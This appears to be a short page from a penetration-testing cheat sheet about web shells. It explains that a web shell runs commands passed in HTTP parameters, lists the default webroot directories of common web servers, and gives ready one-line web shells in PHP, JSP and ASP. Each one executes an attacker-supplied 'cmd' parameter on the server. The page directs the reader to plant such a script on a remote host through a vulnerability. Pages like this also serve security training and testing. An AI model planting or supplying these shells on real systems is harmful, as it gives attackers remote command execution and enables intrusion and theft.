---
layout: default
title: Web shells
permalink: /web_shells/
---

# Web Shell
A Web Shell is typically a web script, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
We need to place our web shell script into the remote host's web directory (webroot) to execute the script. This can be through a vulnerability.
<br>
| Web Server | Default Webroot           |
|------------|---------------------------|
| Apache     | /var/www/html/            |
| Nginx      | /usr/local/nginx/html/    |
| IIS        | c:\inetpub\wwwroot\       |
| XAMPP      | C:\xampp\htdocs\          |



## PHP

```
<?php system($_REQUEST["cmd"]); ?>
```

## JSP

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## ASP

```
<% eval request("cmd") %>
```
